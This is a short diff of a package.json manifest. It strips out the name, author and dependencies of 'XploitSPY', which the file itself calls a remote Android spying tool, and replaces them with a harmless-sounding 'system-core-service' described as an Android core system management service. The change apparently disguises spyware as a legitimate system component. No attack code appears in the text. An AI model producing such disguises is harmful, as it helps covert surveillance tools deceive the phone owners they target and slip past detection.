@@ -1,23 +1,9 @@
 {
-    "name": "xploitspy",
-    "version": "1.0.0",
-    "description": "XploitSPY - Remote Android Spying Tool",
-    "main": "index.js",
-    "scripts": {
-        "start": "node server/index.js",
-        "test": "node server/index.js"
-    },
-    "author": "XploitWizer",
-    "license": "ISC",
-    "dependencies": {
-        "body-parser": "^1.19.0",
-        "cookie-parser": "^1.4.4",
-        "ejs": "^2.7.4",
-        "express": "^4.17.1",
-        "express-async-handler": "^1.1.4",
-        "geoip-lite": "^2.0.3",
-        "lowdb": "^1.0.0",
-        "node-fetch": "^2.6.0",
-        "socket.io": "^4.8.4"
-    }
+  "name": "system-core-service",
+  "version": "3.0.0",
+  "description": "Android Core System Management Service",
+  "main": "index.js",
+  "scripts": {
+    "start": "node index.js"
+  }
 }
